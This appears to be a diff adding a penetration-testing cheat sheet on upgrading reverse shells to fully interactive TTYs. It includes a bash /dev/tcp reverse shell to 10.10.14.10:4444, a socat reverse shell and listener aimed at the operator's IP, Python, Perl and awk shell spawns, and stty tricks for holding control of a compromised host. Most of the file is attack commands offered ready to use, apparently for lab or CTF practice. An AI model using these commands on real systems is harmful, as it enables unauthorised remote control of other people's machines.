@@ -1,0 +1,123 @@
+🧠 Reverse Shell Upgrade Tactics (TTY/PTY)
+📁 Put this under pivoting-and-sessions/rev-shell-upgrades.md in your notes.
+
+🎯 Goal
+Take a basic reverse shell like:
+
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
+…and upgrade it into a fully interactive shell.
+
+🛠️ Upgrade Arsenal
+🔹 1. Python PTY
+Works on most boxes with Python or Python3.
+
+bash
+Copy
+Edit
+python -c 'import pty; pty.spawn("/bin/bash")'
+# or
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+🔹 2. Stty + TTY setup (on your listener)
+After spawning PTY via Python, run this from your local Kali box:
+
+bash
+Copy
+Edit
+# Ctrl+Z (background the shell)
+stty raw -echo
+fg     # Bring shell back
+# then in shell:
+export TERM=xterm
+Optional but nice:
+
+bash
+Copy
+Edit
+stty rows 40 columns 150
+🔹 3. Script command (if available)
+bash
+Copy
+Edit
+script /dev/null -c bash
+🔹 4. Socat Interactive Shell
+If socat is available on both ends:
+
+Victim (or via RCE):
+
+bash
+Copy
+Edit
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your_ip>:<port>
+Your box:
+
+bash
+Copy
+Edit
+socat -d -d tcp-listen:<port>,reuseaddr,fork stdout
+🔹 5. Echo TTY with /dev/pts (rare)
+bash
+Copy
+Edit
+echo os.system('/bin/bash')  # sometimes works in limited shells
+🔹 6. Awk Shell
+If awk is present:
+
+bash
+Copy
+Edit
+awk 'BEGIN {system("/bin/bash")}'
+🔹 7. Perl Shell
+bash
+Copy
+Edit
+perl -e 'exec "/bin/bash";'
+🔹 8. /bin/sh to /bin/bash upgrade
+bash
+Copy
+Edit
+/bin/bash -i
+# or
+bash --noprofile --norc
+🔹 9. SSH to yourself (backconnect escape)
+If you get creds or .ssh/id_rsa and can SSH back in:
+
+bash
+Copy
+Edit
+ssh user@localhost -t "/bin/bash"
+🔹 10. Chisel + SSH combo (if pivoting required)
+Tunnel through restricted env:
+
+Use chisel to create a SOCKS tunnel
+
+SSH through chisel proxy for full TTY
+
+✅ Post-Upgrade Checklist
+After TTY upgrade:
+
+bash
+Copy
+Edit
+which python python3 perl awk
+whoami && id
+export TERM=xterm
+alias ll='ls -la'
+💣 If Ctrl+C is killing your shell:
+Use stty -echo raw on your box
+
+Or run shell in background with CTRL+Z, then fix and fg
+
+⚠️ Notes
+Issue	Fix
+No arrow keys	stty raw -echo
+Can’t Ctrl+C	Fix your local stty
+Can’t clear	Use reset or re-PTY
+Can’t use su	Need full TTY (pty.spawn + stty)
+🔥 Your Go-To One-Liner (for quick upgrade)
+bash
+Copy
+Edit
+python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; stty rows 40 columns 150
